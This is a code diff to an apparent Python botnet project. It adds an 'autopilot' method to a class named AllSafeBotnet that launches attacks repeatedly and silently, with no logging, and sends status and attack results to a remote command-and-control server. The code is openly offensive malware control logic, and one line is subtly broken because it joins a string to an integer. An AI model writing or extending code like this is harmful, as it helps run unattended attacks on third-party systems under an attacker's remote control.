@@ -22,7 +22,7 @@ from Request import Request
 import requests
 
 from utils.config import validateConfigFile
-from utils.log import logInfo, logAttack
+from utils.log import logInfo, logAttack, logCCUpdate
 
 
 
@@ -283,6 +283,33 @@ class AllSafeBotnet():
             if botnet.is_alive():
                 botnet.terminate()
                 self._botnet_queue = Queue()
+
+    def autopilot(self, server, configuration, timer, override=False):
+        """
+        Method to start a new attack session silently... with autopilot inserted.
+        Note: no runtime logging or stats are enabled!
+        @param: server, string - C&C remote address
+        @param: configuration, string - path to the configuration file
+        @param: timer, int - time interval in seconds between each iteration
+        """
+        # verify C&C
+        up = True
+        if not override:
+            up = logCCUpdate(server, self._botnet_identity, "starting up in autopilot mode - timing " + int(timer))
+        else:
+            up = False
+
+        while True:
+            # attacking using configuration provided 
+            # or checking for C&C updated configuration
+            attackres = self.attack(configuration, override=up)
+            # updating C&C and its connection status
+            if up:
+                up = logCCUpdate(server, attackres[0], attackres[1])
+            # sleeping
+            threadSleep(timer)
+            
+
 
 
     class Botnet(Process):
